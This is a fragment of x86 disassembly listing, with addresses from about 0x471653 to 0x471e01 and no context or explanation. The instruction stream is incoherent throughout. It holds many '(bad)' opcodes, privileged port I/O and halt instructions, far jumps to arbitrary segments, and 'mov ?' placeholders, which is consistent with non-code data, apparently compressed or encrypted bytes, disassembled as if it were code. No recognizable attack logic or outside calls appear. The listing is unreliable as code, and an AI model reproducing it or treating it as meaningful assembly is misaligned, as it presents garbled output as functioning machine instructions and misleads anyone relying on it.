  471653:	jne    0xd2a0986d
  471659:	shl    BYTE PTR ds:0x187e1976,0x1
  471660:	daa    
  471661:	sbb    BYTE PTR [edi-0x40d3de],0x6c
  471668:	and    al,0x14
  47166a:	mov    cl,BYTE PTR [edi]
  47166c:	in     eax,dx
  47166d:	dec    ebx
  47166e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47166f:	push   edx
  471670:	cmp    DWORD PTR [ebx+0x52],eax
  471673:	popa   
  471674:	jge    0x47169d
  471676:	and    al,0x64
  471678:	nop
  471679:	xchg   ecx,eax
  47167a:	pushf  
  47167b:	add    BYTE PTR [esi-0x14f8e941],bh
  471681:	pop    edx
  471682:	ror    BYTE PTR [ebp+0x75],0xee
  471686:	sub    al,0x41
  471688:	cmp    eax,eax
  47168a:	loop   0x4716ad
  47168c:	dec    edi
  47168d:	cmp    al,al
  47168f:	jmp    0x47170b
  471691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  471692:	cmp    BYTE PTR [eax+0x26fded34],ch
  471698:	adc    BYTE PTR [eax],dl
  47169a:	les    cx,DWORD PTR [edi+0x1f]
  47169e:	mov    esp,0x3930bdc2
  4716a3:	add    bh,BYTE PTR [ecx]
  4716a5:	es or  bh,bh
  4716a8:	ja     0x4716ae
  4716aa:	sti    
  4716ab:	add    ebx,DWORD PTR [edi]
  4716ad:	jno    0x47169f
  4716af:	popf   
  4716b0:	fiadd  DWORD PTR [ebx]
  4716b2:	aaa    
  4716b3:	inc    eax
  4716b4:	jmp    0x84f1:0xf9892ece
  4716bb:	out    dx,ax
  4716bd:	js     0x471647
  4716bf:	inc    edi
  4716c0:	add    DWORD PTR [eax+0x38],esi
  4716c3:	add    al,BYTE PTR [ebx]
  4716c5:	je     0x4716cd
  4716c7:	cmp    ch,ah
  4716c9:	sahf   
  4716ca:	fwait
  4716cb:	in     al,0x4c
  4716cd:	fmul   st,st(3)
  4716cf:	dec    edx
  4716d0:	les    edx,FWORD PTR [edi+eiz*1]
  4716d3:	popa   
  4716d4:	pop    ss
  4716d5:	or     al,0x86
  4716d7:	sbb    DWORD PTR [edx],edx
  4716d9:	sub    ebp,esp
  4716db:	pop    ebx
  4716dc:	jl     0x4716e3
  4716de:	aaa    
  4716df:	mov    ?,eax
  4716e1:	nop
  4716e2:	mov    al,0x11
  4716e4:	(bad)  
  4716e6:	fnstcw WORD PTR [ebx-0x16]
  4716e9:	mov    ebx,0x2424f70a
  4716ee:	mov    ecx,eax
  4716f0:	jne    0x471756
  4716f2:	and    al,0xc
  4716f4:	add    DWORD PTR [edx],edx
  4716f6:	ss ret 
  4716f8:	(bad)  
  4716f9:	jae    0x4716f5
  4716fb:	adc    edx,ecx
  4716fd:	pop    ecx
  4716fe:	pop    ecx
  4716ff:	ret    0x5808
  471702:	pop    ss
  471703:	push   cs
  471704:	outs   dx,BYTE PTR ds:[esi]
  471705:	and    ah,bh
  471707:	xchg   esp,eax
  471708:	inc    ecx
  471709:	jo     0x471753
  47170b:	mov    bh,0xff
  47170d:	jne    0x471717
  47170f:	cmp    esp,DWORD PTR [ebx+0x1f8187c3]
  471715:	cmc    
  471716:	mov    es,WORD PTR [edi+0x46]
  471719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47171a:	mov    ?,WORD PTR [edx-0x101ba8f2]
  471720:	dec    ebp
  471721:	or     al,0x20
  471723:	mov    ds:0x7b3cb60e,eax
  471728:	mov    al,ds:0xed40b51
  47172d:	call   0xe65fa2d2
  471732:	sbb    edi,DWORD PTR [edx]
  471734:	jae    0x47177d
  471736:	ja     0x471714
  471738:	pop    es
  471739:	mov    al,0x4
  47173b:	xor    eax,0x98b74837
  471740:	pop    ss
  471741:	jno    0x471714
  471743:	call   DWORD PTR [eax-0xccbebd]
  471749:	cmp    DWORD PTR [ebp-0x18],0xffffff80
  47174d:	or     eax,0xdf4e6d83
  471752:	les    ebx,FWORD PTR [edi+0x1138643d]
  471758:	clc    
  471759:	movzx  eax,BYTE PTR [eax+0x1]
  47175d:	add    DWORD PTR [edi],esi
  47175f:	and    esp,0xffffffc0
  471762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  471763:	jo     0x4716fb
  471765:	push   eax
  471766:	push   es
  471767:	data16 loopne 0x471799
  47176a:	ret    0xb088
  47176d:	sbb    al,0x9d
  47176f:	mov    al,0xdd
  471771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  471772:	push   cs
  471773:	(bad)  
  471774:	imul   esi
  471776:	int    0xec
  471778:	sar    BYTE PTR [ebx],0xf0
  47177b:	je     0x47176b
  47177d:	(bad)  
  47177f:	xchg   BYTE PTR [edi-0x5cf7df7d],bh
  471785:	or     BYTE PTR [edx+0x75013883],bl
  47178b:	cmp    al,0xe
  47178d:	push   eax
  47178e:	xlat   BYTE PTR ds:[ebx]
  47178f:	push   edx
  471790:	fist   WORD PTR [eax-0x1c]
  471793:	cmp    edi,ebx
  471795:	jle    0x4717b6
  471797:	das    
  471798:	sbb    DWORD PTR [edi],ebp
  47179a:	shr    ah,0x5
  47179d:	dec    DWORD PTR [ebp+0x6c]
  4717a0:	imul   edx,esi
  4717a3:	add    eax,edx
  4717a5:	mov    ecx,edi
  4717a7:	sub    ecx,ebx
  4717a9:	pop    ds
  4717aa:	nop
  4717ab:	lea    ecx,[edx-0x30]
  4717ae:	mov    esp,0xb99c3060
  4717b3:	inc    esi
  4717b4:	in     al,0x9f
  4717b6:	loope  0x471795
  4717b8:	jnp    0x471838
  4717ba:	jmp    0x47181f
  4717bc:	push   esi
  4717bd:	call   DWORD PTR [eax+0x7d906629]
  4717c3:	lock jae 0x4717d9
  4717c6:	lahf   
  4717c7:	std    
  4717c8:	cmp    ebx,DWORD PTR [ebp-0x10]
  4717cb:	jge    0x4717d0
  4717cd:	mov    DWORD PTR [eax],ecx
  4717cf:	cdq    
  4717d0:	sub    al,0xb6
  4717d2:	mov    gs,WORD PTR [edx-0x5a4c41da]
  4717d8:	xor    ecx,ecx
  4717da:	dec    esp
  4717db:	and    BYTE PTR [eax+0x4e],cl
  4717de:	push   eax
  4717df:	jl     0x471818
  4717e1:	xchg   ebx,eax
  4717e2:	or     BYTE PTR [eax-0x5e],bl
  4717e5:	ror    DWORD PTR [ebp-0x45],1
  4717e8:	and    BYTE PTR [eax+0x30],0xbf
  4717ec:	push   cs
  4717ed:	retf   0x564d
  4717f0:	into   
  4717f1:	mov    edx,DWORD PTR [ebp-0x34]
  4717f4:	cmp    dh,ah
  4717f6:	ja     0x4717ec
  4717f8:	inc    ebp
  4717f9:	sub    ecx,DWORD PTR [edx+0x19]
  4717fc:	add    DWORD PTR [ebx-0x53],eax
  4717ff:	int3   
  471800:	inc    ebp
  471801:	fstp   TBYTE PTR [edx-0x76fce041]
  471807:	sbb    BYTE PTR [ecx],dl
  471809:	shr    DWORD PTR [ebx],cl
  47180b:	xlat   BYTE PTR ds:[ebx]
  47180c:	mov    cl,0xc6
  47180e:	or     bh,al
  471810:	add    ebx,DWORD PTR [esi]
  471812:	xor    eax,0xb536dedc
  471817:	out    0xf4,al
  471819:	add    DWORD PTR [esi+0x28],edi
  47181c:	or     BYTE PTR ds:[edi+edi*8],al
  471820:	(bad)  
  471821:	dec    ebx
  471822:	sti    
  471823:	cmp    eax,0x1cac0af4
  471828:	inc    ebx
  471829:	xor    esi,esi
  47182b:	ins    BYTE PTR es:[edi],dx
  47182c:	outs   dx,BYTE PTR ds:[esi]
  47182d:	lea    eax,[eax+esi*4]
  471830:	shl    BYTE PTR [ecx+0xf],0x7f
  471834:	inc    ecx
  471835:	hlt    
  471836:	xchg   edi,eax
  471837:	mov    al,ds:0xe7754b46
  47183c:	aad    0x9e
  47183e:	mov    bh,BYTE PTR [ebx-0x15]
  471841:	mov    ds:0x5be58bae,eax
  471846:	rcl    BYTE PTR [ebx+eax*4-0x2a],0xd1
  47184b:	nop
  47184c:	push   eax
  47184d:	mov    esp,0xc7ae4104
  471852:	xor    edx,DWORD PTR [ebx-0x58f00770]
  471858:	lock dec DWORD PTR [ecx-0x8]
  47185c:	jne    0x471885
  47185e:	(bad)  
  47185f:	cmc    
  471860:	mov    WORD PTR [eax],ds
  471862:	inc    edx
  471863:	xor    eax,0x84de2c54
  471868:	xchg   edx,eax
  471869:	adc    DWORD PTR [ebx],ecx
  47186b:	lock inc esp
  47186d:	pop    es
  47186e:	mov    edi,esp
  471870:	dec    ecx
  471871:	ja     0x47187c
  471873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  471874:	xchg   ebp,eax
  471875:	(bad)  
  471876:	sbb    BYTE PTR [eax+0x26],al
  471879:	mov    ds:0xa4a9c315,eax
  47187e:	adc    al,0xe
  471880:	dec    ebx
  471881:	pop    eax
  471882:	adc    al,0xb0
  471884:	aas    
  471885:	(bad)  
  471886:	push   eax
  471887:	push   edx
  471888:	mov    edx,ecx
  47188a:	inc    DWORD PTR [ebx-0x8]
  47188d:	das    
  47188e:	pop    edx
  47188f:	pop    eax
  471890:	out    dx,al
  471891:	(bad)  
  471892:	les    edx,FWORD PTR ds:[eax]
  471895:	aas    
  471896:	xor    BYTE PTR [edx+0x1c],ch
  471899:	sub    al,0xe1
  47189b:	enter  0x1181,0xf1
  47189f:	jne    0x471825
  4718a1:	(bad)  
  4718a2:	or     BYTE PTR [ebp+0x27],dh
  4718a5:	jae    0x47186e
  4718a7:	xchg   DWORD PTR [ebx+ebp*8-0x68e3dbfe],esi
  4718ae:	mov    esp,0x883e7e84
  4718b3:	push   es
  4718b4:	clc    
  4718b5:	fadd   DWORD PTR [ebx-0x7d45f385]
  4718bb:	test   al,0xb6
  4718bd:	sub    edi,ecx
  4718bf:	add    al,0x56
  4718c1:	sub    esp,ecx
  4718c3:	or     eax,edx
  4718c5:	push   es
  4718c6:	std    
  4718c7:	les    esi,FWORD PTR [edx-0x2bef48e6]
  4718cd:	mov    BYTE PTR [esi-0x80],0xe0
  4718d1:	inc    esp
  4718d2:	xchg   esp,eax
  4718d3:	sbb    bh,BYTE PTR [edx-0x76cb912a]
  4718d9:	inc    ebx
  4718da:	adc    BYTE PTR [edx],cl
  4718dc:	adc    BYTE PTR [esi+0x8],dh
  4718df:	pop    esp
  4718e0:	dec    edx
  4718e1:	js     0x47190a
  4718e3:	xchg   ecx,eax
  4718e4:	mul    DWORD PTR [edx]
  4718e6:	mov    esi,esp
  4718e8:	mov    eax,ds:0x5c696234
  4718ed:	jmp    0xce42:0x2b02061e
  4718f4:	pop    esp
  4718f5:	mov    ecx,0x80d4413
  4718fa:	je     0x471903
  4718fc:	or     al,0x75
  4718fe:	or     esi,ebp
  471900:	cmp    al,BYTE PTR [esi-0x5373e3c6]
  471906:	or     eax,0xf8d09b43
  47190b:	xchg   edi,eax
  47190c:	ss aad 0x8b
  47190f:	sti    
  471910:	mov    eax,edi
  471912:	pop    edx
  471913:	push   edi
  471914:	push   ecx
  471915:	xchg   esi,eax
  471916:	push   ds
  471917:	push   eax
  471918:	adc    DWORD PTR [esi-0x73],esi
  47191b:	jne    0x471919
  47191d:	xor    ch,bl
  47191f:	pop    esp
  471920:	jne    0x47192c
  471922:	jb     0x471965
  471924:	push   ax
  471926:	mov    bh,0x0
  471928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  471929:	ret    
  47192a:	sbb    bl,dl
  47192c:	xchg   DWORD PTR [ebp+0xf],ebp
  47192f:	push   ss
  471930:	inc    esp
  471931:	dec    edi
  471932:	mov    esp,0x56606892
  471937:	inc    eax
  471938:	ret    
  471939:	pusha  
  47193a:	jae    0x47190d
  47193c:	mov    ds:0x6844eea5,eax
  471941:	jo     0x471961
  471943:	cmp    eax,0x2b57a268
  471948:	loope  0x4718e7
  47194a:	loopne 0x47197c
  47194c:	iret   
  47194d:	test   DWORD PTR [ebp+0x6bc8507a],esp
  471953:	(bad)  
  471954:	push   esi
  471955:	mov    bh,bh
  471957:	outs   dx,BYTE PTR ds:[esi]
  471958:	or     al,0x54
  47195a:	clc    
  47195b:	push   eax
  47195c:	sub    ebx,DWORD PTR [ebp-0x25]
  47195f:	jne    0x4719d3
  471961:	addr16 std 
  471963:	inc    esi
  471964:	sbb    eax,DWORD PTR [eax+0xf41f638]
  47196a:	js     0x47194d
  47196c:	mov    eax,0x5c01c02b
  471971:	fsub   QWORD PTR [edi]
  471973:	jle    0x47198d
  471975:	fiadd  WORD PTR [edx+0x422f187d]
  47197b:	inc    esp
  47197c:	jl     0x471937
  47197e:	inc    esp
  47197f:	add    eax,DWORD PTR [esi+0xd2a6bf6]
  471985:	xor    esi,eax
  471987:	inc    eax
  471988:	das    
  471989:	cmc    
  47198a:	sbb    dh,0x2f
  47198d:	jb     0x471968
  47198f:	or     DWORD PTR [edi+0x2d],esp
  471992:	mov    ds:0x8dfc5d2b,al
  471997:	inc    ebx
  471998:	add    ebx,edx
  47199a:	aaa    
  47199b:	lods   al,BYTE PTR ds:[esi]
  47199c:	sbb    eax,0x30e1e9db
  4719a1:	sbb    DWORD PTR [eax+0x7d],0xffffffec
  4719a5:	sub    ecx,DWORD PTR [esi+ebp*4]
  4719a8:	or     BYTE PTR [esi+ecx*1+0x42],0xc3
  4719ad:	inc    eax
  4719ae:	cmp    eax,0xd36edb6e
  4719b3:	push   0x5747a9d8
  4719b8:	inc    esi
  4719b9:	jno    0x4719ed
  4719bb:	loope  0x471997
  4719bd:	fnstenv [edx]
  4719bf:	jne    0x47194d
  4719c1:	stos   BYTE PTR es:[edi],al
  4719c2:	(bad)  
  4719c3:	fwait
  4719c4:	cmp    BYTE PTR [edi],ah
  4719c6:	fild   DWORD PTR [ebx+0x248306ad]
  4719cc:	je     0x471a49
  4719ce:	push   DWORD PTR [eax]
  4719d0:	xor    dh,dl
  4719d2:	(bad)  
  4719d3:	cwde   
  4719d4:	mov    bh,0xfb
  4719d6:	cdq    
  4719d7:	jmp    0x7fa1:0x1c01538d
  4719de:	pop    esp
  4719df:	mov    BYTE PTR [ebp+ebx*1+0x1db85c65],0xda
  4719e7:	ss ins BYTE PTR es:[edi],dx
  4719e9:	jnp    0x471a16
  4719eb:	ret    
  4719ec:	dec    eax
  4719ed:	push   eax
  4719ee:	push   ebx
  4719ef:	mov    ebp,0x9c7fbf40
  4719f4:	and    BYTE PTR [edi],0xe3
  4719f7:	inc    eax
  4719f8:	inc    edx
  4719f9:	in     al,dx
  4719fa:	rol    DWORD PTR [ebp+0xd58c949],0x67
  471a01:	out    0x81,al
  471a03:	jmp    FWORD PTR [esi+0x21]
  471a06:	xchg   ebx,eax
  471a07:	mul    BYTE PTR [ebx]
  471a09:	push   eax
  471a0a:	imul   esp,DWORD PTR [ebp+0x72],0x6e
  471a0e:	gs ins BYTE PTR es:[edi],dx
  471a10:	xor    esi,DWORD PTR [edx]
  471a12:	idiv   edi
  471a14:	out    dx,eax
  471a15:	hlt    
  471a16:	cs fs ins BYTE PTR es:[edi],dx
  471a19:	ins    BYTE PTR es:[edi],dx
  471a1a:	cmova  esp,DWORD PTR [ebp+0x74]
  471a1e:	dec    esp
  471a1f:	outs   dx,DWORD PTR ds:[esi]
  471a20:	outs   dx,BYTE PTR ds:[esi]
  471a21:	addr16 push eax
  471a23:	popa   
  471a24:	je     0x471a8e
  471a26:	dec    esi
  471a27:	popa   
  471a28:	ins    DWORD PTR es:[edi],dx
  471a29:	gs inc ecx
  471a2b:	daa    
  471a2c:	sub    edx,DWORD PTR [esi]
  471a2e:	out    0xb,eax
  471a30:	scas   eax,DWORD PTR es:[edi]
  471a31:	fdiv   st(6),st
  471a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  471a34:	push   ecx
  471a35:	iret   
  471a36:	mov    esi,0x1cdfb890
  471a3b:	pop    ds
  471a3c:	mov    BYTE PTR [ebp-0x12],0x22
  471a40:	into   
  471a41:	push   0x40142959
  471a46:	call   0x590ffe4b
  471a4b:	mov    ?,WORD PTR [esi-0x30]
  471a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  471a4f:	add    DWORD PTR [edx],ebp
  471a51:	cmp    eax,DWORD PTR [edx]
  471a53:	push   ss
  471a54:	xor    dh,BYTE PTR [eax-0x1b88ddb5]
  471a5a:	repnz push ebx
  471a5c:	mov    eax,0x8864a902
  471a61:	push   edi
  471a62:	xor    BYTE PTR [eax+0x47381be0],bl
  471a68:	sbb    al,0x9
  471a6a:	mov    edx,0xa14e941f
  471a6f:	mov    ch,0x31
  471a71:	test   al,0x8c
  471a73:	call   0x74d308fc
  471a78:	push   es
  471a79:	or     eax,DWORD PTR [ecx-0x5]
  471a7c:	int    0xb8
  471a7e:	aas    
  471a7f:	rol    eax,0xcc
  471a82:	outs   dx,BYTE PTR ds:[esi]
  471a83:	iret   
  471a84:	add    al,0x59
  471a86:	cmp    eax,DWORD PTR [ecx+ecx*4]
  471a89:	in     eax,dx
  471a8a:	jo     0x471a95
  471a8c:	fwait
  471a8d:	push   es
  471a8e:	repnz add BYTE PTR [ecx],ah
  471a91:	(bad)  
  471a92:	push   edi
  471a93:	inc    ebx
  471a94:	mov    ecx,0xfbdd853a
  471a9a:	aas    
  471a9b:	scas   al,BYTE PTR es:[edi]
  471a9c:	imul   eax,DWORD PTR [edi],0x6afedf39
  471aa2:	add    eax,0x1903f3ac
  471aa7:	or     DWORD PTR [edi],ebx
  471aa9:	out    dx,al
  471aaa:	mov    edi,0x33502578
  471aaf:	fild   DWORD PTR [eax-0x633be43]
  471ab5:	in     eax,dx
  471ab6:	mov    esp,0x7d7ef4d6
  471abb:	repz test al,0xa
  471abe:	or     ch,dh
  471ac0:	push   ds
  471ac1:	jmp    0xae5b2041
  471ac6:	(bad)  
  471ac7:	in     al,dx
  471ac8:	xchg   ebp,eax
  471ac9:	pop    ss
  471aca:	repnz inc esp
  471acc:	fst    QWORD PTR [esp+edx*1+0x60]
  471ad0:	jmp    0x471ad5
  471ad2:	stos   BYTE PTR es:[edi],al
  471ad3:	in     al,0x7a
  471ad5:	in     al,0x2e
  471ad7:	je     0x471ae4
  471ad9:	add    esp,DWORD PTR [ecx+0x6c]
  471adc:	fwait
  471add:	inc    edi
  471ade:	cmp    ebx,DWORD PTR [edx]
  471ae0:	jne    0x471acc
  471ae2:	adc    eax,0xc07e3995
  471ae7:	(bad)  
  471ae9:	inc    edx
  471aea:	xchg   esp,eax
  471aeb:	mul    ah
  471aed:	sub    edx,eax
  471aef:	inc    ebx
  471af0:	pusha  
  471af1:	das    
  471af2:	mov    eax,0x76b5c283
  471af7:	and    eax,0xb2c96a02
  471afc:	or     eax,0xe080681e
  471b01:	jne    0x471b75
  471b03:	or     eax,0xc2f6c74
  471b08:	pop    ss
  471b09:	leave  
  471b0a:	lds    esi,FWORD PTR [edi-0xd]
  471b0d:	ss ss ja 0x471aad
  471b11:	mov    bl,BYTE PTR [ecx-0x3c748ca2]
  471b17:	iret   
  471b18:	push   ebx
  471b19:	sbb    eax,0x6ffe16a1
  471b1e:	data16 je 0x471b98
  471b21:	popa   
  471b22:	jb     0x471b89
  471b24:	bswap  edx
  471b26:	arpl   di,dx
  471b28:	ret    0xf66a
  471b2b:	popa   
  471b2c:	ins    BYTE PTR es:[edi],dx
  471b2d:	gs jae 0x471b62
  471b30:	aaa    
  471b31:	inc    edi
  471b32:	jle    0x471af4
  471b34:	pop    ss
  471b35:	imul   eax,DWORD PTR [ebp-0x3d],0x49
  471b39:	adc    al,0x4f
  471b3b:	dec    ecx
  471b3c:	xor    al,0xe1
  471b3e:	ins    BYTE PTR es:[edi],dx
  471b3f:	jl     0x471b53
  471b41:	xlat   BYTE PTR ds:[ebx]
  471b42:	mov    eax,0xe01aa0d8
  471b47:	addr16 xchg ebx,eax
  471b49:	adc    eax,0x410cb38
  471b4e:	and    eax,0xa3dc2b80
  471b53:	adc    edi,edi
  471b55:	es jecxz 0x471af9
  471b58:	hlt    
  471b59:	xor    al,dh
  471b5b:	jmp    0x247f:0x782138a1
  471b62:	cmp    eax,0x3b332574
  471b67:	(bad)  
  471b68:	jne    0x471b85
  471b6a:	das    
  471b6b:	or     ebx,DWORD PTR [ebx+edi*8-0x459a1bfc]
  471b72:	cdq    
  471b73:	xor    al,0xc1
  471b75:	push   eax
  471b76:	jmp    0x471b0c
  471b78:	outs   dx,BYTE PTR ds:[esi]
  471b79:	jmp    0x471bbb
  471b7b:	adc    al,BYTE PTR [edx+0x3f]
  471b7e:	pop    esp
  471b7f:	xlat   BYTE PTR ss:[ebx]
  471b81:	add    DWORD PTR [eax-0x297d9120],ebp
  471b87:	inc    ebx
  471b88:	addr16 or dh,0x9e
  471b8c:	push   eax
  471b8d:	sbb    al,0x90
  471b8f:	and    ch,BYTE PTR [edx-0x8]
  471b92:	jae    0x471ba7
  471b94:	sub    edi,DWORD PTR [esi+0x2]
  471b97:	imul   ecx,DWORD PTR [ebx],0xca756b31
  471b9d:	pop    ecx
  471b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  471b9f:	adc    eax,0xaf790e0b
  471ba4:	je     0x471bdc
  471ba6:	mov    edx,0x1bdf7812
  471bab:	cmp    DWORD PTR [edi+0x163459fb],esp
  471bb1:	pop    esp
  471bb2:	inc    ecx
  471bb3:	cli    
  471bb4:	push   edx
  471bb5:	sahf   
  471bb6:	or     al,0x23
  471bb8:	rol    dl,1
  471bba:	add    al,0x5b
  471bbc:	or     ch,BYTE PTR [esi]
  471bbe:	xor    al,0x62
  471bc0:	loope  0x471b72
  471bc2:	pop    ss
  471bc3:	push   es
  471bc4:	jno    0x471c3b
  471bc6:	(bad)  
  471bc7:	daa    
  471bc8:	adc    dh,ch
  471bca:	push   edx
  471bcb:	adc    ah,ch
  471bcd:	xor    al,0xa3
  471bcf:	or     eax,0xb01dd90d
  471bd4:	paddsb mm6,QWORD PTR [ebp+0x1b205aa5]
  471bdb:	mov    BYTE PTR [ecx+0x4996e020],al
  471be1:	mov    esp,0xe56ec2b3
  471be6:	lods   al,BYTE PTR ds:[esi]
  471be7:	pop    edx
  471be8:	cmp    eax,DWORD PTR ds:0x190c7575
  471bee:	lea    edi,[esi-0x140fc1f5]
  471bf4:	xor    ah,BYTE PTR [ebx+0x4b]
  471bf7:	and    al,0xf5
  471bf9:	cmp    esi,DWORD PTR [eax+0x3ccd84c0]
  471bff:	inc    edi
  471c00:	mov    edx,0x740eebec
  471c05:	jo     0x471bda
  471c07:	inc    ecx
  471c08:	and    esp,ebx
  471c0a:	cmp    DWORD PTR [edi+0x1f94f12b],ebp
  471c10:	mov    eax,0xff028b4f
  471c15:	push   eax
  471c16:	or     BYTE PTR [edx],ch
  471c18:	sbb    DWORD PTR [ecx-0x9e4f4a9],eax
  471c1e:	add    dl,BYTE PTR [edx+0x2e]
  471c21:	pop    eax
  471c22:	mov    ecx,DWORD PTR [eax]
  471c24:	pop    esi
  471c26:	frstor [eax+ebx*4+0x70]
  471c2a:	sub    BYTE PTR [ebx-0x68bfaeff],cl
  471c30:	mov    dh,0x5
  471c32:	pop    esi
  471c33:	fldcw  WORD PTR [eax]
  471c35:	je     0x471c3d
  471c37:	sbb    eax,0x2621db5e
  471c3c:	int3   
  471c3d:	mov    ah,0x5e
  471c3f:	sahf   
  471c40:	push   esp
  471c41:	push   ecx
  471c42:	mov    edi,DWORD PTR [ebp+0x46]
  471c45:	and    DWORD PTR [edx+0x17c0c0aa],ebx
  471c4b:	fild   WORD PTR [edi]
  471c4d:	(bad)  [eax+0x6b]
  471c50:	loope  0x471c6a
  471c52:	push   es
  471c53:	les    esi,FWORD PTR [esi+0x1dc35fde]
  471c59:	ds loope 0x471c9c
  471c5c:	sbb    al,0x4
  471c5e:	dec    bx
  471c60:	lock shr al,1
  471c63:	ins    DWORD PTR es:[edi],dx
  471c64:	sbb    al,0x1e
  471c66:	mov    ch,0x7
  471c68:	mov    eax,ds:0xb191ce06
  471c6d:	ja     0x471c94
  471c6f:	enter  0x806,0xc3
  471c73:	and    bh,BYTE PTR [ebp-0x4c115084]
  471c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  471c7a:	push   ecx
  471c7b:	push   eax
  471c7c:	adc    BYTE PTR ds:[esp+ecx*1-0x561bd97d],ch
  471c84:	xchg   ecx,eax
  471c85:	js     0x471cab
  471c87:	nop
  471c88:	add    eax,0x30804eb8
  471c8d:	pop    ss
  471c8e:	push   ds
  471c8f:	push   ss
  471c90:	push   0xc4af000c
  471c95:	mov    bl,0x7d
  471c97:	mov    al,BYTE PTR [ebp-0x40]
  471c9a:	call   0x8dbfc4fe
  471c9f:	inc    ebx
  471ca0:	push   es
  471ca1:	mov    ds:0x3fdfb181,al
  471ca6:	or     esp,ebp
  471ca8:	aaa    
  471ca9:	xor    BYTE PTR [eax+ecx*4],bl
  471cac:	ret    
  471cad:	icebp  
  471cae:	add    al,0x50
  471cb0:	test   al,0xa9
  471cb2:	js     0x471cc8
  471cb4:	dec    DWORD PTR [ecx-0x2daacfb3]
  471cba:	dec    ebx
  471cbb:	aaa    
  471cbc:	shl    BYTE PTR [edi],0xf1
  471cbf:	mov    eax,0xc933f6a7
  471cc4:	(bad)  
  471cc5:	aas    
  471cc6:	js     0x471cab
  471cc8:	mov    dl,0x87
  471cca:	inc    ebp
  471ccb:	mov    al,0xf
  471ccd:	mov    bh,0x14
  471ccf:	dec    edx
  471cd0:	inc    ecx
  471cd1:	cmp    edx,0x7f
  471cd4:	ja     0x471cdc
  471cd6:	mov    cl,al
  471cd8:	jmp    DWORD PTR [ecx+0x463014fe]
  471cde:	jmp    0x471d39
  471ce0:	cmp    edx,0x8d3176ba
  471ce6:	pop    esi
  471ce7:	add    edi,DWORD PTR [ebx]
  471ce9:	pop    ebp
  471cea:	cld    
  471ceb:	ja     0x471d41
  471ced:	(bad)  
  471cee:	imul   dh
  471cf0:	jg     0x471ccc
  471cf2:	shr    ebx,0xc
  471cf5:	or     bl,0xe0
  471cf8:	mov    BYTE PTR [eax+esi*1],bl
  471cfb:	adc    eax,0x3fe38006
  471d00:	sbb    al,BYTE PTR [eax+0x1305c88]
  471d06:	and    dl,0x6d
  471d09:	xchg   ebp,eax
  471d0a:	jno    0x471cdf
  471d0c:	adc    cl,dl
  471d0e:	push   esp
  471d0f:	xor    BYTE PTR [edx],al
  471d11:	fs jmp 0x471d34
  471d14:	pusha  
  471d15:	add    cl,BYTE PTR [esi+0x222af69d]
  471d1b:	dec    ebx
  471d1c:	pusha  
  471d1d:	rol    BYTE PTR [ebx+0x1],0x37
  471d21:	mov    ebx,0x4d3866ff
  471d26:	or     BYTE PTR [ebx+0x5],dh
  471d29:	cmp    esi,DWORD PTR [ebp-0x4]
  471d2c:	jb     0x471cb8
  471d2e:	or     DWORD PTR [ebx+ecx*4],eax
  471d31:	dec    esi
  471d32:	mov    BYTE PTR [esp+ebx*1],0x2c
  471d36:	mov    edx,0x22083082
  471d3b:	xor    DWORD PTR ds:0xf84812b6,ebx
  471d41:	mov    bl,0x17
  471d43:	lods   al,BYTE PTR ds:[esi]
  471d44:	jbe    0x471d50
  471d46:	pop    es
  471d47:	add    DWORD PTR [esi+0x0],eax
  471d4a:	cmp    BYTE PTR [edx-0x1d],dh
  471d4d:	lea    edx,[esi-0x64]
  471d50:	and    eax,edi
  471d52:	sub    al,al
  471d54:	ret    0xb7ff
  471d57:	lock fldcw WORD PTR [eax+0x3aed62c4]
  471d5e:	add    BYTE PTR [edx+0x50],bl
  471d61:	jbe    0x471d56
  471d63:	jno    0x471d55
  471d65:	dec    ebp
  471d66:	ret    0xec7
  471d69:	stc    
  471d6a:	sar    BYTE PTR [ebx],0xe1
  471d6d:	adc    al,0x8
  471d6f:	(bad)  
  471d70:	out    dx,al
  471d71:	cld    
  471d72:	dec    esp
  471d73:	xor    eax,DWORD PTR [edx]
  471d75:	cld    
  471d76:	add    eax,0xf455729b
  471d7b:	cli    
  471d7c:	mov    cl,BYTE PTR [edx+esi*1]
  471d7f:	inc    esi
  471d80:	test   cl,0x80
  471d83:	and    bl,bl
  471d85:	dec    edi
  471d86:	ret    0xc05
  471d89:	or     BYTE PTR [edi],cl
  471d8b:	adc    DWORD PTR [eax-0x7d],0xffffffe1
  471d8f:	aas    
  471d90:	and    BYTE PTR [eax],ah
  471d92:	je     0x471d83
  471d94:	cld    
  471d95:	fistp  QWORD PTR [esi+0x148a3c2e]
  471d9b:	cmp    BYTE PTR [ebx-0x3f1c7f26],cl
  471da1:	cmp    bl,0x80
  471da4:	jne    0x11466965
  471daa:	push   ds
  471dab:	pushf  
  471dac:	mov    dl,0x98
  471dae:	and    edx,0x6e1c110
  471db4:	or     edi,DWORD PTR [edi-0x2e12e275]
  471dba:	mov    ecx,edx
  471dbc:	pop    ebx
  471dbd:	lea    ecx,[ecx+0x66]
  471dc0:	dec    edx
  471dc1:	dec    ebp
  471dc2:	cld    
  471dc3:	pushaw 
  471dc5:	mov    edi,0x1489e94e
  471dca:	inc    ecx
  471dcb:	clc    
  471dcc:	push   ebp
  471dcd:	adc    BYTE PTR [edx+eax*2],cl
  471dd0:	inc    eax
  471dd1:	call   0x9d6:0x59f06e1d
  471dd8:	cmp    eax,DWORD PTR [edx+0x10104470]
  471dde:	mov    esp,0x8aee2ee
  471de3:	dec    eax
  471de4:	cmp    eax,0x244204c7
  471de9:	inc    edi
  471dea:	inc    ebx
  471deb:	inc    edx
  471dec:	mov    bh,0x81
  471dee:	pop    ebp
  471def:	xlat   BYTE PTR ds:[ebx]
  471df0:	sbb    al,0x4c
  471df2:	ret    0x2130
  471df5:	xor    eax,0xac4418ae
  471dfa:	jnp    0x471daf
  471dfc:	dec    ecx
  471dfd:	adc    al,0x1c
  471dff:	in     al,0xfa
  471e01:	xor    BYTE PTR [ebp+0x1e],0x37
